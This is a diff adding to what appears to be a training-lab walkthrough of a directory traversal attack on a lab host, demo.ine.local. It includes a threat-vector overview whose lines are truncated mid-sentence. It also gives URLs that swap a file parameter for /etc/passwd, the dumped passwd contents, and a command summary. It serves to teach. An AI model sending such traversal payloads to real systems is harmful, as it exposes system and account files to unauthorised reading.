@@ -30,19 +30,81 @@ Select one of the files that you want to view. Click on the "View File" button.
 Here, we can see the data from the file displayed on the screen.
 
 
+http://demo.ine.local
+
+What is a threat vector?
+
+In cybersecurity, a threat vector refers to the method or means by which a cyber threat
+Here are some common threat vectors:
+
+Emails and Phishing: Threat actors often use phishing emails to trick users into reve
+Malicious Websites: Visiting compromised or malicious websites can expose users to va
+Social Engineering: Human manipulation techniques, such as pretexting, baiting, or imp
+Malware: Malicious software, including viruses, trojans, ransomware, and spyware, can
+Exploiting Software Vulnerabilities: Threat actors target known vulnerabilities in so
+Supply Chain Attacks: Attackers compromise the supply chain by injecting malicious co
+Insider Threats: Individuals within an organization with access to sensitive informat
+IoT Devices and Smart Technologies: Insecure Internet of Things (IoT) devices and sma
+Understanding the various threat vectors is essential for organizations to implement
+
+
+Now that we have seen how applications work, let's try to find and exploit the vulnerabilities.
+
+Step 5: Let's try to perform the directory traversal attack.
+
+In the URL, we can see that there is a query string parameter "file," which has the value "file2.txt." Let's try to replace this value with something else. 
+
+http://demo.ine.local/view_file?file=file1.txt
+http://demo.ine.local/view_file?file=file2.txt
+http://demo.ine.local/view_file?file=file3.txt
+...
+
+Replace "file2.txt" with "/etc/passwd" and see what we get. Use http://demo.ine.local/view_file?file=/etc/passwd
+
+The Payload: /etc/passwd
+
+The /etc/passwd file is a system file commonly found on Unix-like operating systems, including Linux. It stores essential user account information, such as usernames, user IDs, group IDs, home directories, and shell executables. Each line in the file represents a user account, and the fields are separated by colons.
+
+Visit the URL: http://demo.ine.local/view_file?file=/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+
+Voila! We got the data of "/etc/passwd" file.
+
+
+References
+https://owasp.org/www-community/attacks/Path_Traversal
 
 
 
+>> Commands Summarization <<
 
+ping -c 4 demo.ine.local
 
+http://demo.ine.local
 
+http://demo.ine.local/view_file?file=file1.txt
+http://demo.ine.local/view_file?file=file2.txt
+http://demo.ine.local/view_file?file=file3.txt
 
-
-
-
-
-
-
-
-
+http://demo.ine.local/view_file?file=/etc/passwd
 
